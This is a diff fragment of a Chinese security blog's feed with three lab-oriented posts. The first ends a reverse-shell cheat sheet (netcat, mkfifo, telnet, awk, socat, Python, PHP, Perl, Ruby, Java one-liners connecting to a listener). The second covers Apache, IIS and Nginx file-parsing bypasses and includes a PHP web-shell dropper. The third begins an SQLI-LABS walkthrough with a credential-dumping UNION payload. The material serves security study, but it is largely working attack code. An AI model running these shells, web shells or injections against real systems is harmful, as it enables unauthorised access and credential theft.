+<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p>nc如果版本是有 -e 选项的话就能够直接反弹shell，出于安全原因，Ubuntu自带的nc是不带这个选项的。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.91.128 2333</span><br></pre></td></tr></table></figure>
+<p>如果没有 -e 选项的话还可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.91.128 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+<p>example:</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115210794.png" alt="image-20210326115210794"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115224913.png" alt="image-20210326115224913"></p>
+<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>攻击机上打开两个终端分别执行监听：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
+<p>靶机中执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.91.128 4444 | /bin/bash | telnet 192.168.91.128 5555</span><br></pre></td></tr></table></figure>
+<p>从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</p>
+<p>example：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121226183.png" alt="image-20210326121226183"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121243836.png" alt="image-20210326121243836"></p>
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.91.128/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.91.128:2333</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.91.128&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.91.128&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.99.242&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.91.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>当我们使用Ubuntu作为服务器，是无法直接通过使用命令执行的函数如<code>system()</code>等去执行<code>bash</code>命令，会显示<code>sh: 1: Syntax error: Bad fd number</code>，这个错误在centos中是不会出现的，这是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20190115161623.png" alt="img"></p>
+<h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>由于把Window作为服务器比较少见，在加上里面很多东西我也没见过，这里贴个链接，以备不时之需。</p>
+<p><a class="link"   href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" >Windows 反弹 shell<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://xz.aliyun.com/t/2548" >Linux反弹shell（一）文件描述符与重定向<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://xz.aliyun.com/t/2549#toc-10" >Linux 反弹shell（二）反弹shell的本质<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>反弹shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>服务器文件解析漏洞</title>
+    <url>/2021/03/31/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="服务器文件解析漏洞"><a href="#服务器文件解析漏洞" class="headerlink" title="服务器文件解析漏洞"></a>服务器文件解析漏洞</h1><p>文件解析漏洞,是指Web容器（Apache、nginx、iis等）在解析文件时出现了漏洞,以其他格式执行出脚本格式的效果。从而,黑客可以利用该漏洞实现非法文件的解析。</p>
+<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>linux系统中的apache的php配置文件在<code>/etc/apache2/mods-available</code>这个目录下，我在window上phpstudy环境下找不到这个php的配置文件。</p>
+<h3 id="多后缀解析漏洞"><a href="#多后缀解析漏洞" class="headerlink" title="多后缀解析漏洞"></a>多后缀解析漏洞</h3><p><strong>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令</strong>。</p>
+<ul>
+<li>AddHandler：将文件扩展名映射到指定的处理程序</li>
+</ul>
+<p>什么样的扩展名使用什么样的程序来处理，描述的是扩展名与处理程序之间的关系。如果在 Apache 的 conf 里有这样一行配置 <code>AddHandler application/x-httpd-php .php </code>这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</p>
+<ul>
+<li>AddType：在给定的文件扩展名与特定的内容类型之间建立映射</li>
+</ul>
+<p>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系，例如：<br><code>AddType application/x-httpd-php .jpg</code>，表示.jpg扩展名的文件就是application/x-httpd-php类型的。</p>
+<h4 id="情形一"><a href="#情形一" class="headerlink" title="情形一"></a>情形一</h4><p>如果运维人员给<code>.php</code>后缀增加了处理器：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure>
+<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
+<p>example:</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330095553638.png" alt="image-20210330095553638"></p>
+<p>这里有一个文件上传的入口，我们尝试上传php文件，显示不支持该类型文件上传</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330095714098.png" alt="image-20210330095714098"></p>
+<p>我们把文件后缀改成jpg，再次上传，发现成功上传了</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330095822038.png" alt="image-20210330095822038"></p>
+<p>访问该目录，发现该jpg被解析为了php文件。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330095905610.png" alt="image-20210330095905610"></p>
+<h4 id="情形二"><a href="#情形二" class="headerlink" title="情形二"></a>情形二</h4><p>如果运维人员脑瘫了给<code>.jpg</code>后缀增加了处理器或者类型映射：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .jpg</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+<p>那么我们上传的jpg文件或者带有jpg的多后缀文件都能够以php解析。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330114020908.png" alt="image-20210330114020908"></p>
+<h4 id="情形三"><a href="#情形三" class="headerlink" title="情形三"></a>情形三</h4><p>这种和情形二是一样的，只不过写法不一样，如果运维人员脑瘫了给<code>jpg</code>后缀增加了处理器或者类型映射：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.jpg</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330114612307.png" alt="image-20210330114612307"></p>
+<h3 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h3><p>有一个名为mime.types的文件，其中记录着Apache认识的后缀，在Ubuntu下，该文件位于<code>/etc/mime.types</code>，我们查看它认识PHP哪些后缀，发现其实PHP还有很多别的后缀名。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#application&#x2F;x-httpd-php			phtml pht php</span><br><span class="line">#application&#x2F;x-httpd-php-source			phps</span><br><span class="line">#application&#x2F;x-httpd-php3			php3</span><br><span class="line">#application&#x2F;x-httpd-php3-preprocessed		php3p</span><br><span class="line">#application&#x2F;x-httpd-php4			php4</span><br><span class="line">#application&#x2F;x-httpd-php5			php5</span><br></pre></td></tr></table></figure>
+<p>然后我们再到apache的php的配置文件下看看，发现配置文件下本来就支持php、phar、phtml这三种后缀的文件。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">tml</span>)$&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330141923889.png" alt="image-20210330141923889"></p>
+<p>个人认为这个不是漏洞，只不过apcahe本来就支持这些后缀，但是开发人员的黑名单遗漏了这些罕见的后缀，导致了文件的正常解析。</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>.htaccess是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——**.htaccess**（分布式配置文件）。.htaccess文件可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。</p>
+<p>想要这个生效，一是需要在apache配置文件中把<code>AllowOverride</code>改为<code>All</code></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330145516222.png" alt="image-20210330145516222"></p>
+<p>二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LoadModule rewrite_mudule &#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure>
+<p>若是在Ubuntu中，可能还需要执行命令：(我的Ubuntu18并不需要)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br></pre></td></tr></table></figure>
+<p>配置完成后，我们例如在<code>.htaccess</code>文件中写入<code>AddType application/x-httpd-php .john </code>，则让apache把文件后缀为<code>john</code>的文件都以php的方式解析。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210330145815059.png"></p>
+<h3 id="换行解析漏洞-CVE-2017-15715"><a href="#换行解析漏洞-CVE-2017-15715" class="headerlink" title="换行解析漏洞 CVE-2017-15715"></a>换行解析漏洞 CVE-2017-15715</h3><p>改漏洞影响的apache版本为<strong>2.4.0~2.4.29</strong>（但是我在本机上的2.4.29上传的文件不行，难道是php版本也有很关系？）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		&lt;label&gt;file:&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;&lt;/label&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		&lt;label&gt;filename:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;evil.php&quot;</span>&gt;&lt;/label&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个后端通过<code>basename()</code>来获取用户传入的自定义文件名，再把传入的文件重命名为改文件名，这样就存在换行解析漏洞。</p>
+<p>这里在上传文件时，对文件名进行了黑名单限制，我们利用该漏洞上传一个1.php文件，使用burpsuit抓包。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210331110001890.png" alt="image-20210331110001890"></p>
+<p>在1.php后插入一个\x0A，绕过黑名单过滤，发现能够成功上传，而且访问<code>1.php%0a</code>，文件也能被当作PHP解析。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210331110115712.png" alt="image-20210331110115712"></p>
+<blockquote>
+<p>值得一提的是通常我们也不会使用这样方法给文件命名，正常的办法是使用<code>$_FILES[&#39;upload&#39;][&#39;name&#39;]</code>这种方法获取文件本身的名字，而且一般也会对文件进行重命名为一个随机的名字，因此这个漏洞实际上也很难出现在现实环境中。</p>
+</blockquote>
+<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
+<h3 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h3><p>形式：<a class="link"   href="http://www.xxx.com/xx.asp/xx.jpg" >www.xxx.com/xx.asp/xx.jpg<i class="fas fa-external-link-alt"></i></a></p>
+<p>原理: 在IIS-6.0的版本，在.asp或.asa文件夹下的所有类型后缀文件全部解析为.asp文件。</p>
+<h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p>形式：<a class="link"   href="http://www.xxx.com/xx.asp;.jpg" >www.xxx.com/xx.asp;.jpg<i class="fas fa-external-link-alt"></i></a></p>
+<p>原理：在IIS-6.0的版本，服务器默认不解析;后面的内容，所以xxx.asp;.jpg会被解析成xxx.asp。</p>
+<h3 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h3><p>有的网站在上传检测中会用”黑名单”方法 ,但是IIS6.0 默认的可执行文件除了asp还包含这三种 :</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;test.asa</span><br><span class="line">&#x2F;test.cer</span><br><span class="line">&#x2F;test.cdx</span><br></pre></td></tr></table></figure>
+<h3 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h3><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。<br><strong>跟nginx解析漏洞一样，要在php.ini cgi.fix_pathinfo=1 开启的情况才会产生。</strong></p>
+<p>可以配合操作系统文件命名规则，上传不符合windows文件命名规则的文件名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">test.asp(空格)</span><br><span class="line">test.php:1.jpg</span><br><span class="line">test.php:: $DATA # php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名</span><br></pre></td></tr></table></figure>
+<p><strong>会被windows系统自动去掉不符合规则符号后面的内，然后再配合这个解析漏洞来执行文件。</strong></p>
+<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><h3 id="空字节代码执行漏洞"><a href="#空字节代码执行漏洞" class="headerlink" title="空字节代码执行漏洞"></a>空字节代码执行漏洞</h3><p>旧版本（0.5.*，**0.6.*，0.7，0.8&lt;=0.7.65&lt;=0.8.37）。通过利用此漏洞，攻击者可以导致服务器使用PHP的FastCGI作为PHP的服务器上执行任何公开访问的文件。</p>
+<p><strong>恶意用户发出请求<code>http://example.com/file.ext％00.php</code>就会将file.ext作为PHP文件解析。</strong></p>
+<p><strong>如果一个攻击者可以控制文件的内容（即：使用头像上传形式）其结果是执行任意代码。Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码。</strong></p>
+<h3 id="PHP-CGI解析漏洞"><a href="#PHP-CGI解析漏洞" class="headerlink" title="PHP CGI解析漏洞"></a>PHP CGI解析漏洞</h3><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" >Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写<i class="fas fa-external-link-alt"></i></a><br><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/9113969-ef9717d27ce7f505.png" alt="图片.png"><br>当访问xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI。</p>
+<p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.xxxx.com&#x2F;upload&#x2F;image&#x2F;1.jpg&#x2F;1.php</span><br><span class="line">www.xxxx.com&#x2F;upload&#x2F;image&#x2F;1.jpg&#x2F;%20\00.php</span><br></pre></td></tr></table></figure>
+<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
+<p><strong>这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。</strong><br><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/9113969-85fb966ca25aad8a.png" alt="图片.png"><br>这个往前递归的功能原本是想解决/info.php/test这种URL，能够正确解析到info.php。</p>
+<p>在Nginx配置fastcgi使用php时，会存在文件类型解析问题。其实可以说它与Nginx本身关系不大，Nginx只是作为一个代理把请求转发给fastcgi Server，PHP在后端处理这一切。因此在其他fastcgi环境下，PHP也存在此问题，只是使用Nginx作为Web Server时，一般使用fastcgi的方式调用脚本解释器，这种使用方式最为常见。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://blog.csdn.net/qq_41617034/article/details/105069094" >文件解析漏洞总结-Apache<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" >文件解析漏洞总结<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/m0_37711941/article/details/88684515" >Apache漏洞—多后缀名解析、目录遍历和(CVE-2017-15715)<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>服务器解析</tag>
       </tags>
   </entry>
   <entry>
@@ -2547,6 +2637,316 @@
       </tags>
   </entry>
   <entry>
+    <title>SQLI-LABS (Adv Injections) 21-37关</title>
+    <url>/2021/03/07/SQLI-LABS%20(Adv%20Injections)%2021-37%E5%85%B3/</url>
+    <content><![CDATA[<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">                 <span class="comment"># 对 cookee 进行 base64 解密</span></span><br><span class="line">        <span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过源码看出，后端会把传入的cookie中的<code>uname</code>参数进行base64解密，然后再进行查询，所以我们传入的cookie中的<code>uname</code>要尽心base64加密才行。同时注意到，这里的闭合方式为<code>(&#39;$uname&#39;)</code></p>
+<p>查询语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;sqlsec&#39;) union select 1,2,(SELECT GROUP_CONCAT(username,&#39;:&#39;,password) FROM users)#</span><br></pre></td></tr></table></figure>
+<p>我们可以利用hackbar进行base64加密：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSwnOicscGFzc3dvcmQpIEZST00gdXNlcnMpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304212001660.png" alt="image-20210304212001660"></p>
+<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><ul>
